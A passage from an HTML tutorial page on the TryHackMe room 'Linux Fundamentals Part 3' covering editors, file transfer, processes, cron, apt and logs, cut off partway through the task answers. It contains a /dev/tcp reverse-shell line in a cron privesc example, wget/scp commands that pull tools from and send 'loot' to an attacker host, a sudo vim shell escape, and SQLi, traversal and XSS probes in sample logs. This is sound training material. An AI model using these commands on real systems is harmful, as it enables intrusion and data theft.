@@ -1,0 +1,974 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Linux Fundamentals Part 3 — THM · Cybersecurity 101 ☕</title>
+<link rel="stylesheet" href="../../assets/styles.css" />
+<style>
+  /* ---- CRON BUILDER (interactive) ---- */
+  .cron-builder {
+    background: #0a0f13;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px;
+    margin: 18px 0;
+    font-family: var(--mono);
+  }
+  .cron-fields {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 10px;
+    margin: 16px 0;
+  }
+  .cron-slot {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .cron-slot label {
+    font-size: 11px;
+    color: var(--ink-mute);
+    text-transform: uppercase;
+    margin-bottom: 6px;
+    letter-spacing: 0.08em;
+  }
+  .cron-slot input {
+    width: 100%;
+    text-align: center;
+    font-family: var(--mono);
+    font-size: 1.4rem;
+    padding: 10px;
+    background: #000;
+    color: var(--accent);
+    border: 2px solid var(--accent);
+    border-radius: 6px;
+    outline: none;
+  }
+  .cron-slot input:focus {
+    background: rgba(0,255,157,0.08);
+    box-shadow: 0 0 14px rgba(0,255,157,0.3);
+  }
+  .cron-output {
+    background: #000;
+    padding: 14px;
+    border-radius: 6px;
+    border-left: 3px solid var(--accent-2);
+    margin-top: 8px;
+  }
+  .cron-output .preview {
+    font-size: 1.2rem;
+    color: var(--accent-2);
+    font-family: var(--mono);
+    word-break: break-all;
+  }
+  .cron-output .english {
+    margin-top: 10px;
+    font-family: var(--sans);
+    color: var(--ink-dim);
+    font-size: 14px;
+  }
+  .cron-presets {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-top: 12px;
+  }
+  .cron-preset {
+    padding: 6px 12px;
+    background: rgba(0,212,255,0.1);
+    border: 1px solid var(--accent-3);
+    color: var(--accent-3);
+    border-radius: 16px;
+    font-size: 12px;
+    cursor: pointer;
+    font-family: var(--sans);
+    transition: all 0.15s;
+  }
+  .cron-preset:hover { background: var(--accent-3); color: #000; }
+
+  /* ---- PROCESS TABLE ---- */
+  .ps-demo {
+    background: #000;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    font-family: var(--mono);
+    font-size: 13px;
+    margin: 16px 0;
+    overflow-x: auto;
+  }
+  .ps-demo table { width: 100%; border-collapse: collapse; }
+  .ps-demo th {
+    text-align: left;
+    padding: 6px 10px;
+    color: var(--accent);
+    border-bottom: 1px solid var(--border);
+    font-size: 11px;
+    text-transform: uppercase;
+  }
+  .ps-demo td {
+    padding: 4px 10px;
+    color: var(--ink-dim);
+    border-bottom: 1px dashed rgba(255,255,255,0.05);
+  }
+  .ps-demo tr.root td { color: var(--accent-2); }
+  .ps-demo tr.you td { color: var(--accent); }
+  .ps-demo tr:hover td { background: rgba(255,255,255,0.02); }
+  .ps-demo .kill-btn {
+    padding: 3px 8px;
+    background: transparent;
+    border: 1px solid var(--accent-2);
+    color: var(--accent-2);
+    border-radius: 4px;
+    cursor: pointer;
+    font-family: var(--mono);
+    font-size: 11px;
+  }
+  .ps-demo .kill-btn:hover { background: var(--accent-2); color: #000; }
+  .ps-demo tr.killed td { opacity: 0.3; text-decoration: line-through; }
+
+  /* ---- UTILITY DECISION CARD ---- */
+  .util-card {
+    background: #0a0f13;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px;
+    position: relative;
+    transition: all 0.2s;
+    overflow: hidden;
+  }
+  .util-card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 4px;
+    background: var(--accent);
+  }
+  .util-card.transfer::before { background: var(--accent-3); }
+  .util-card.schedule::before { background: var(--warn); }
+  .util-card.monitor::before { background: var(--accent-2); }
+  .util-card h4 { margin: 0 0 8px; color: var(--accent); font-family: var(--mono); }
+  .util-card.transfer h4 { color: var(--accent-3); }
+  .util-card.schedule h4 { color: var(--warn); }
+  .util-card.monitor h4 { color: var(--accent-2); }
+
+  /* ---- LOG ANALYZER ---- */
+  .log-analyzer {
+    background: #000;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.7;
+    margin: 16px 0;
+    overflow-x: auto;
+  }
+  .log-analyzer .log-line { cursor: help; padding: 2px 4px; border-radius: 3px; transition: background 0.1s; }
+  .log-analyzer .log-line:hover { background: rgba(0,255,157,0.08); }
+  .log-analyzer .log-ip { color: var(--accent-3); font-weight: bold; }
+  .log-analyzer .log-time { color: var(--ink-mute); }
+  .log-analyzer .log-req { color: var(--accent); }
+  .log-analyzer .log-404 { color: var(--warn); }
+  .log-analyzer .log-200 { color: var(--accent); }
+  .log-analyzer .log-500 { color: var(--accent-2); }
+  .log-analyzer .log-evil { background: rgba(255,46,99,0.15); border-left: 3px solid var(--accent-2); padding-left: 8px; }
+</style>
+</head>
+<body data-page-slug="thm-linux-fundamentals-part-3">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../../index.html">Home</a>
+    <a href="../../index.html#topics-web">Topics</a>
+    <a href="../../glossary/index.html">Glossary</a>
+    <a href="../index.html" class="active">THM</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="../index.html">TryHackMe</a>
+  <span class="sep">›</span>
+  <a href="../index.html#paths">Cybersecurity 101</a>
+  <span class="sep">›</span>
+  <span>Linux Fundamentals Part 3</span>
+</div>
+
+<!-- HERO -->
+<section class="hero" style="min-height: 55vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">🐧 thm · cybersecurity 101 · room 03 · the finale</span>
+    <h1>Linux Fundamentals <span style="color: var(--accent-2);">Pt. 3</span></h1>
+    <p class="subtitle">The daily-driver Linux toolkit. Nano &amp; vim, wget, scp, processes, cron, systemd, apt, logs.<br>End the series knowing how to <em>actually live</em> in a terminal.</p>
+    <div class="tagline">"Part 1 showed you the house. Part 2 gave you the keys. Part 3 hands you the chainsaw." 🔥</div>
+    <div style="margin-top: 24px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;">
+      <a href="https://tryhackme.com/room/linuxfundamentalspart3" target="_blank" rel="noopener" class="cta-btn ghost">↗ Open on TryHackMe</a>
+      <a href="#tasks" class="cta-btn">Jump to Tasks 🎯</a>
+    </div>
+  </div>
+</section>
+
+<!-- TL;DR -->
+<section class="chapter" id="tldr">
+  <div class="chapter-num">TL;DR</div>
+  <h2><span class="emoji">⚡</span> What you'll actually walk away with</h2>
+  <div class="grid cols-3">
+    <div class="card">
+      <h4>📝 Nano &amp; vim basics</h4>
+      <p>Edit files in the terminal. Nano for speed. Vim for flexing on people.</p>
+    </div>
+    <div class="card">
+      <h4>🔧 wget · scp · python http.server</h4>
+      <p>Move files between machines three different ways. The pentester's exfil trio.</p>
+    </div>
+    <div class="card">
+      <h4>🔢 Processes, kill, &amp; systemd</h4>
+      <p>See what's running. Kill what shouldn't be. Make a service start at boot.</p>
+    </div>
+    <div class="card">
+      <h4>⏰ cron automation</h4>
+      <p>Schedule commands. And understand why cron is the #1 privesc goldmine.</p>
+    </div>
+    <div class="card">
+      <h4>📦 apt package mgmt</h4>
+      <p>Install, remove, trust software from repos — the right way.</p>
+    </div>
+    <div class="card">
+      <h4>📝 Log file literacy</h4>
+      <p>Read /var/log/. Find real IPs, usernames, and attack footprints.</p>
+    </div>
+  </div>
+
+  <div class="callout info" style="margin-top: 20px;">
+    <strong>☕ Heads up:</strong> This is the biggest room of the three and THM blasts you with screenshots. The rewrite below turns every screenshot into an interactive demo you can actually <em>play with</em>. Do the tasks on THM's box first — then come here and lock the concepts in.
+  </div>
+</section>
+
+<div class="divider">the concepts</div>
+
+<!-- ===== CONCEPT 1: TEXT EDITORS ===== -->
+<section class="chapter" id="concept-editors">
+  <div class="chapter-num">Concept 01 // Text editors</div>
+  <h2><span class="emoji">📝</span> Nano vs Vim — editing files without a mouse</h2>
+  <p class="lead">So far we've only written files with <code class="inline">echo</code> and <code class="inline">&gt;&gt;</code>. Good luck editing a 500-line config that way. Enter terminal text editors.</p>
+
+  <div class="paper">
+    <h4>📝 Think of it like Notepad vs Photoshop, but for terminals</h4>
+    <p><strong>Nano</strong> is Notepad — open a file, type stuff, save, exit. Zero learning curve. <strong>Vim</strong> is Photoshop — insane power, but you spend the first hour unable to figure out how to quit. (<code class="inline">:q!</code>. You're welcome.)</p>
+  </div>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>😇 Nano — friendly mode</h4>
+      <div class="code" style="margin-top: 8px;">nano myfile.txt</div>
+      <ul style="font-size: 14px; margin-top: 8px;">
+        <li><code class="inline">Ctrl+O</code> — save (write out)</li>
+        <li><code class="inline">Ctrl+X</code> — exit</li>
+        <li><code class="inline">Ctrl+W</code> — search</li>
+        <li><code class="inline">Ctrl+K</code> — cut line</li>
+        <li><code class="inline">Ctrl+U</code> — paste</li>
+      </ul>
+      <p style="font-size: 12px; color: var(--ink-mute);">The <code class="inline">^</code> in nano's bottom bar means Ctrl.</p>
+    </div>
+    <div class="card">
+      <h4>😤 Vim — power mode</h4>
+      <div class="code" style="margin-top: 8px;">vim myfile.txt</div>
+      <ul style="font-size: 14px; margin-top: 8px;">
+        <li><code class="inline">i</code> — insert mode (start typing)</li>
+        <li><code class="inline">Esc</code> — back to normal mode</li>
+        <li><code class="inline">:w</code> — save</li>
+        <li><code class="inline">:q</code> — quit</li>
+        <li><code class="inline">:wq</code> — save and quit</li>
+        <li><code class="inline">:q!</code> — quit WITHOUT saving (abort)</li>
+        <li><code class="inline">/pattern</code> — search</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="callout success">
+    <strong>🎯 For this room, just use nano.</strong> Vim is a rabbit hole worth going down later (THM has a dedicated room). For now, nano handles 100% of what you need.
+  </div>
+
+  <div class="brain-power">
+    <div class="label">🧠 Brain Power</div>
+    <div class="question">Why do pentesters sometimes prefer vim on a remote box even though nano is easier?</div>
+    <button class="reveal-btn" onclick="toggleAnswer(this)">Reveal answer</button>
+    <div class="answer">
+      <p>Three reasons: <strong>(1) vim is on EVERY Linux box by default</strong> — even minimal containers. Nano isn't always there. <strong>(2) vim can spawn shells.</strong> If <code class="inline">sudo -l</code> shows you can run vim as root → <code class="inline">sudo vim</code> then <code class="inline">:!bash</code> → root shell. <a href="https://gtfobins.github.io/gtfobins/vim/" target="_blank" rel="noopener">GTFOBins</a> has the full list. <strong>(3) vim works over slow/laggy SSH connections</strong> better than nano's redraw-the-whole-screen approach.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== CONCEPT 2: FILE TRANSFER ===== -->
+<section class="chapter" id="concept-transfer">
+  <div class="chapter-num">Concept 02 // Moving files between machines</div>
+  <h2><span class="emoji">📦</span> <span class="term" data-term="wget">wget</span>, <span class="term" data-term="scp">scp</span>, and python's http.server</h2>
+  <p class="lead">Three tools that every pentester has in muscle memory. Each solves "how do I get file X onto/off of machine Y?" in a different situation.</p>
+
+  <div class="grid cols-3">
+    <div class="util-card transfer">
+      <h4>⬇️ wget</h4>
+      <p style="font-size: 13px;">Pull a file from any HTTP/HTTPS URL onto this machine.</p>
+      <div class="code" style="margin-top: 8px; font-size: 12px;">wget http://10.10.1.5:8000/lp.sh</div>
+      <p style="font-size: 11px; color: var(--ink-mute); margin-top: 6px;">💡 Run it on the TARGET. The target pulls from your server.</p>
+    </div>
+    <div class="util-card transfer">
+      <h4>📤 scp</h4>
+      <p style="font-size: 13px;">Push/pull files over SSH. Needs valid SSH creds on the other end.</p>
+      <div class="code" style="margin-top: 8px; font-size: 12px;">scp file.txt user@10.10.1.5:/tmp/</div>
+      <p style="font-size: 11px; color: var(--ink-mute); margin-top: 6px;">💡 Encrypted. Two-way. Best for loot exfil.</p>
+    </div>
+    <div class="util-card transfer">
+      <h4>🐍 python3 -m http.server</h4>
+      <p style="font-size: 13px;">Turn any directory into a web server in 2 seconds flat.</p>
+      <div class="code" style="margin-top: 8px; font-size: 12px;">python3 -m http.server 8000</div>
+      <p style="font-size: 11px; color: var(--ink-mute); margin-top: 6px;">💡 Run on YOUR box. Target then wget's from you.</p>
+    </div>
+  </div>
+
+  <h3>The classic pentest file-shuttle combo</h3>
+  <div class="code">
+<span class="com"># ------- On your attack box (you) -------</span>
+cd /tools
+python3 -m http.server <span class="str">8000</span>
+<span class="com"># Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+
+<span class="com"># ------- On the target box (compromised) -------</span>
+wget http://<span class="str">YOUR_IP</span>:8000/linpeas.sh -O /tmp/lp.sh
+chmod +x /tmp/lp.sh
+/tmp/lp.sh | tee /tmp/lp-output.txt
+
+<span class="com"># ------- Send loot back to attacker -------</span>
+scp /tmp/lp-output.txt <span class="str">you@YOUR_IP</span>:/loot/target1.txt
+  </div>
+
+  <div class="callout danger">
+    <strong>🚨 Don't run http.server on a public IP.</strong> Anyone on the internet can grab every file in that directory. CTF networks = fine. Your home IP = stop.
+  </div>
+</section>
+
+<!-- ===== CONCEPT 3: PROCESSES ===== -->
+<section class="chapter" id="concept-processes">
+  <div class="chapter-num">Concept 03 // Processes 101</div>
+  <h2><span class="emoji">🔢</span> <span class="term" data-term="pid">PIDs</span>, ps, kill, signals</h2>
+  <p class="lead">Every running program on Linux = one process with one unique PID. To manage the system, you need to see what's running and stop (or start) specific ones.</p>
+
+  <div class="paper right">
+    <h4>📝 Think of PIDs like hospital wristbands</h4>
+    <p>Every program that's running gets a unique number. "Who is PID 1337?" "Oh that's Apache." Doctors refer to patients by their wristband number. Linux refers to processes by their PID.</p>
+  </div>
+
+  <h3>Interactive: a live-ish process table</h3>
+  <p>Here's what <code class="inline">ps aux</code> looks like. Click a PID's <strong>KILL</strong> button to see it disappear — like on the real box.</p>
+
+  <div class="ps-demo">
+    <table>
+      <thead>
+        <tr><th>USER</th><th>PID</th><th>%CPU</th><th>%MEM</th><th>COMMAND</th><th></th></tr>
+      </thead>
+      <tbody id="psBody">
+        <tr class="root"><td>root</td><td>1</td><td>0.0</td><td>0.4</td><td>/lib/systemd/systemd</td><td><button class="kill-btn" disabled title="PID 1 cannot be killed">🔒</button></td></tr>
+        <tr class="root"><td>root</td><td>245</td><td>0.1</td><td>1.2</td><td>/usr/sbin/sshd -D</td><td><button class="kill-btn" onclick="killProc(this)">kill</button></td></tr>
+        <tr class="root"><td>root</td><td>312</td><td>0.0</td><td>0.8</td><td>/usr/sbin/cron -f</td><td><button class="kill-btn" onclick="killProc(this)">kill</button></td></tr>
+        <tr class="you"><td>you</td><td>1337</td><td>0.2</td><td>3.1</td><td>/usr/bin/python3 exploit.py</td><td><button class="kill-btn" onclick="killProc(this)">kill</button></td></tr>
+        <tr class="you"><td>you</td><td>1501</td><td>15.2</td><td>0.7</td><td>./background.sh</td><td><button class="kill-btn" onclick="killProc(this)">kill</button></td></tr>
+        <tr><td>www-data</td><td>2044</td><td>0.0</td><td>2.4</td><td>/usr/sbin/apache2 -k start</td><td><button class="kill-btn" onclick="killProc(this)">kill</button></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>The kill signals you actually need to know</h3>
+  <div class="grid cols-3">
+    <div class="card">
+      <h4>SIGTERM (15)</h4>
+      <p><code class="inline">kill 1337</code> — polite. Asks the process to clean up and exit. Default.</p>
+    </div>
+    <div class="card">
+      <h4>SIGKILL (9)</h4>
+      <p><code class="inline">kill -9 1337</code> — rude. Kernel kills it. No cleanup. Use when TERM is ignored.</p>
+    </div>
+    <div class="card">
+      <h4>SIGSTOP</h4>
+      <p><code class="inline">kill -SIGSTOP 1337</code> — pause. Process freezes mid-execution. Resume with SIGCONT.</p>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <strong>💡 Interview trivia:</strong> SIGKILL is the only signal a process cannot catch, block, or ignore. That's why it's the nuclear option.
+  </div>
+
+  <h3>Background &amp; foreground</h3>
+  <div class="code">
+<span class="com"># Launch in background with &amp;</span>
+./long_scan.sh &amp;
+<span class="com"># [1] 19802   &nbsp;← job number, PID</span>
+
+<span class="com"># Or: run in foreground, pause with Ctrl+Z, then background</span>
+./long_scan.sh
+<span class="com"># (hit Ctrl+Z to pause)</span>
+bg          <span class="com"># resume in background</span>
+fg          <span class="com"># bring back to foreground</span>
+jobs        <span class="com"># list all background jobs in THIS shell</span>
+  </div>
+</section>
+
+<!-- ===== CONCEPT 4: systemd/systemctl ===== -->
+<section class="chapter" id="concept-systemd">
+  <div class="chapter-num">Concept 04 // Services at boot</div>
+  <h2><span class="emoji">⚙️</span> <span class="term" data-term="systemd">systemd</span> — making things start automatically</h2>
+  <p class="lead">Some programs need to run <em>every time the machine boots</em>. Web servers, SSH daemons, databases. That's systemd's job.</p>
+
+  <div class="code">
+<span class="com"># The 5 verbs you'll actually type:</span>
+sudo systemctl <span class="str">start</span>   apache2    <span class="com"># start NOW</span>
+sudo systemctl <span class="str">stop</span>    apache2    <span class="com"># stop NOW</span>
+sudo systemctl <span class="str">enable</span>  apache2    <span class="com"># auto-start at boot</span>
+sudo systemctl <span class="str">disable</span> apache2    <span class="com"># don't auto-start at boot</span>
+systemctl <span class="str">status</span>       apache2    <span class="com"># is it running? when did it start?</span>
+  </div>
+
+  <div class="callout info">
+    <strong>💡 The classic rookie mistake:</strong> <code class="inline">systemctl enable apache2</code> does NOT start it. Enable = "next reboot, turn on." Use <code class="inline">enable --now</code> to do both in one go.
+  </div>
+</section>
+
+<!-- ===== CONCEPT 5: CRON (THE BIG ONE) ===== -->
+<section class="chapter" id="concept-cron">
+  <div class="chapter-num">Concept 05 // Automation</div>
+  <h2><span class="emoji">⏰</span> <span class="term" data-term="cron">cron</span> — schedule anything, forever</h2>
+  <p class="lead">The robot that wakes up every minute, checks a list of scheduled jobs, and runs anything that's due. Beloved by admins. <em>Worshipped</em> by attackers.</p>
+
+  <div class="paper">
+    <h4>📝 Think of it like setting an alarm, but the alarm runs bash commands</h4>
+    <p>You tell cron: "Every Monday at 3:00 AM, run <code>backup.sh</code>." Cron remembers. Cron does it. Forever. Even if you forget, it doesn't.</p>
+  </div>
+
+  <h3>The 5 time fields</h3>
+  <p>Every cron line = 5 numbers + 1 command. Left to right: <strong>minute, hour, day-of-month, month, day-of-week</strong>.</p>
+
+  <div class="cron-builder">
+    <p style="margin-top: 0; color: var(--ink-dim); font-size: 13px;">🧪 Click into any field and change the value. See the cron line + plain English translation update live.</p>
+    <div class="cron-fields">
+      <div class="cron-slot"><label>Minute</label><input type="text" id="cMin" value="0" maxlength="8" /></div>
+      <div class="cron-slot"><label>Hour</label><input type="text" id="cHour" value="3" maxlength="8" /></div>
+      <div class="cron-slot"><label>DOM</label><input type="text" id="cDom" value="*" maxlength="8" /></div>
+      <div class="cron-slot"><label>Month</label><input type="text" id="cMon" value="*" maxlength="8" /></div>
+      <div class="cron-slot"><label>DOW</label><input type="text" id="cDow" value="*" maxlength="8" /></div>
+    </div>
+
+    <div class="cron-output">
+      <div class="preview" id="cronPreview">0 3 * * * /usr/bin/backup.sh</div>
+      <div class="english" id="cronEnglish">At minute 0 of hour 3 (3:00 AM), every day.</div>
+    </div>
+
+    <div class="cron-presets">
+      <span class="cron-preset" onclick="setCron(0,3,'*','*','*')">Daily 3 AM</span>
+      <span class="cron-preset" onclick="setCron('*/5','*','*','*','*')">Every 5 min</span>
+      <span class="cron-preset" onclick="setCron(0,'*/12','*','*','*')">Every 12 hours</span>
+      <span class="cron-preset" onclick="setCron(0,9,'*','*','1-5')">Weekdays 9 AM</span>
+      <span class="cron-preset" onclick="setCron(0,0,1,'*','*')">1st of month</span>
+      <span class="cron-preset" onclick="setCron('*','*','*','*','*')">Every minute 😱</span>
+    </div>
+  </div>
+
+  <h3>Editing YOUR crontab</h3>
+  <div class="code">
+crontab -e     <span class="com"># open MY crontab in your default editor</span>
+crontab -l     <span class="com"># print MY crontab</span>
+crontab -r     <span class="com"># delete MY crontab (careful)</span>
+  </div>
+
+  <div class="callout danger">
+    <strong>🚨 Why cron is a privesc goldmine:</strong>
+    Cron jobs often run as <strong>root</strong>. If you (as a low-priv user) can WRITE to a script that cron runs as root → you can add a reverse-shell line → on the next cron tick, you're root. Always enumerate <code class="inline">/etc/crontab</code>, <code class="inline">/etc/cron.d/</code>, and <code class="inline">/etc/cron.{hourly,daily,weekly,monthly}/</code> when hunting privesc. <a href="../../glossary/privilege-escalation.html">Full methodology →</a>
+  </div>
+
+  <div class="brain-power">
+    <div class="label">🧠 Brain Power</div>
+    <div class="question">A dev sets up a backup cron job:<br><code class="inline">*/5 * * * * /home/alice/backup.sh</code><br>Later, Alice <code class="inline">chmod 777</code>'s <code class="inline">backup.sh</code> because "it's just a backup script." The cron line runs as root. You landed on the box as user "bob." What happens next?</div>
+    <button class="reveal-btn" onclick="toggleAnswer(this)">Reveal answer</button>
+    <div class="answer">
+      <p>You append one line to the end of <code class="inline">backup.sh</code>:</p>
+      <div class="code" style="margin: 10px 0;">bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</div>
+      <p>Within 5 minutes, cron runs that script as root. Your netcat listener catches a reverse shell. <strong>UID = 0.</strong> You didn't exploit a CVE, crack a password, or abuse a kernel bug. You just read the crontab and the permissions. That's 80% of Linux privesc in real life.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== CONCEPT 6: apt ===== -->
+<section class="chapter" id="concept-apt">
+  <div class="chapter-num">Concept 06 // Package management</div>
+  <h2><span class="emoji">📦</span> <span class="term" data-term="apt">apt</span> — installing software safely</h2>
+  <p class="lead">On Debian, Ubuntu, Kali, Parrot — apt is how you install, update, and remove software. Every Linux user types <code class="inline">sudo apt install ...</code> a thousand times.</p>
+
+  <div class="code">
+<span class="com"># The daily driver</span>
+sudo apt update                  <span class="com"># refresh package catalog</span>
+sudo apt upgrade -y              <span class="com"># apply all updates</span>
+sudo apt install nmap            <span class="com"># install a new package</span>
+sudo apt remove nmap             <span class="com"># uninstall</span>
+sudo apt autoremove              <span class="com"># clean up orphaned dependencies</span>
+apt search &lt;term&gt;                <span class="com"># find a package by name</span>
+apt show &lt;pkg&gt;                   <span class="com"># details about a package</span>
+  </div>
+
+  <h3>Repositories &amp; <span class="term" data-term="gpg">GPG</span> trust</h3>
+  <p>apt doesn't install random tarballs. Every package comes from a <strong>repository</strong> listed in <code class="inline">/etc/apt/sources.list</code>, and every repo is signed with a <span class="term" data-term="gpg">GPG key</span> your system trusts. If the signature fails, install fails.</p>
+  <div class="code">
+cat /etc/apt/sources.list                <span class="com"># main repos</span>
+ls /etc/apt/sources.list.d/              <span class="com"># extra repos (third-party)</span>
+apt-key list                             <span class="com"># trusted keys (legacy)</span>
+ls /etc/apt/keyrings/                    <span class="com"># trusted keys (modern)</span>
+  </div>
+
+  <div class="callout danger">
+    <strong>⚠️ Never <code class="inline">curl | sudo bash</code> random install scripts.</strong> You're trusting that URL — and any redirects it followed — with root on your machine. Prefer adding a proper repo + GPG key, or use <code class="inline">apt</code> directly.
+  </div>
+</section>
+
+<!-- ===== CONCEPT 7: LOGS ===== -->
+<section class="chapter" id="concept-logs">
+  <div class="chapter-num">Concept 07 // Log files</div>
+  <h2><span class="emoji">📝</span> <span class="term" data-term="log-file">/var/log</span> — the server's diary</h2>
+  <p class="lead">Everything the system does ends up in a log somewhere. Learning to read logs is the single most useful defensive skill — and a top-tier offensive enumeration skill.</p>
+
+  <h3>Interactive: hover each line to spot the bug</h3>
+  <p>Here's a snippet of <code class="inline">/var/log/apache2/access.log</code>. Hover each request and spot what's suspicious.</p>
+
+  <div class="log-analyzer">
+    <div class="log-line" title="Normal GET /. Status 200. Looks fine."><span class="log-ip">192.168.1.50</span> - - [<span class="log-time">22/Apr/2026:13:40:01</span>] <span class="log-req">"GET / HTTP/1.1"</span> <span class="log-200">200</span> 1843</div>
+    <div class="log-line" title="User requests /login. Fine so far."><span class="log-ip">192.168.1.50</span> - - [<span class="log-time">22/Apr/2026:13:40:03</span>] <span class="log-req">"GET /login.php HTTP/1.1"</span> <span class="log-200">200</span> 912</div>
+    <div class="log-line log-evil" title="🚨 SQL injection attempt! Single quote + OR 1=1 in URL. Classic SQLi payload."><span class="log-ip">185.220.101.7</span> - - [<span class="log-time">22/Apr/2026:13:40:15</span>] <span class="log-req">"GET /login.php?user=admin'+OR+1=1--</span> HTTP/1.1" <span class="log-200">200</span> 2847</div>
+    <div class="log-line log-evil" title="🚨 Path traversal! ../../../ in URL trying to read /etc/passwd."><span class="log-ip">185.220.101.7</span> - - [<span class="log-time">22/Apr/2026:13:40:18</span>] <span class="log-req">"GET /download?f=../../../etc/passwd</span> HTTP/1.1" <span class="log-404">404</span> 312</div>
+    <div class="log-line log-evil" title="🚨 XSS probe! &lt;script&gt; tag in query string."><span class="log-ip">185.220.101.7</span> - - [<span class="log-time">22/Apr/2026:13:40:22</span>] <span class="log-req">"GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt;</span> HTTP/1.1" <span class="log-200">200</span> 1203</div>
+    <div class="log-line" title="Legit user again. Just browsing."><span class="log-ip">192.168.1.50</span> - - [<span class="log-time">22/Apr/2026:13:40:30</span>] <span class="log-req">"GET /about HTTP/1.1"</span> <span class="log-200">200</span> 556</div>
+  </div>
+
+  <p style="font-size: 13px; color: var(--ink-dim); margin-top: 10px;">The red lines? All from the same IP <code class="inline">185.220.101.7</code> (which happens to be a known Tor exit node). Three different attack patterns in ten seconds. A real SOC analyst sees this and fires off an incident ticket.</p>
+
+  <h3>The logs you care about most</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>🔑 <code class="inline">/var/log/auth.log</code></h4>
+      <p>Every login, sudo, SSH attempt. First stop when investigating an auth breach.</p>
+    </div>
+    <div class="card">
+      <h4>🌐 <code class="inline">/var/log/apache2/access.log</code></h4>
+      <p>Every single HTTP request hitting your web server. Gold for attack detection.</p>
+    </div>
+    <div class="card">
+      <h4>🛡️ <code class="inline">/var/log/fail2ban.log</code></h4>
+      <p>Who got blocked for brute-forcing. Also reveals if you're being scanned.</p>
+    </div>
+    <div class="card">
+      <h4>📋 <code class="inline">/var/log/syslog</code></h4>
+      <p>Catch-all for system events. cron runs, service restarts, kernel warnings.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">the tasks</div>
+
+<!-- ===== TASKS ===== -->
+<section class="chapter" id="tasks">
+  <div class="chapter-num">Retention &amp; Tasks</div>
+  <h2><span class="emoji">🎯</span> THM task answers + why they work</h2>
+  <p class="lead">Full walk-through of every task. Answer + <em>reasoning</em> in each collapsible. Answers that depend on the live machine are marked <code class="inline">[[MACHINE]]</code>.</p>
+
+  <!-- TASK 1 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 1</div>
+    <h4>Introduction</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">Read-only intro. Let's proceed!</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">ANSWER:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHY:</strong>
+          Just click "Complete" and move on.
+        </div>
+      </div>
+    </details>
+  </div>
+
+  <!-- TASK 2 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 2</div>
+    <h4>Deploy Your Linux Machine</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">Start the AttackBox, start the target, SSH in with <code class="inline">tryhackme:tryhackme</code> to 10.113.144.8 (or whatever IP the room shows).</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">ANSWER:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHY:</strong>
+          You need both boxes running — the AttackBox (you SSH FROM) and the target (you SSH TO). From the AttackBox terminal: <code class="inline">ssh tryhackme@&lt;MACHINE_IP&gt;</code>, password <code class="inline">tryhackme</code>.
+        </div>
+      </div>
+    </details>
+  </div>
+
+  <!-- TASK 3 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 3</div>
+    <h4>Terminal Text Editors</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">Create a file with nano, then edit ~/task3 and find the flag inside.</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
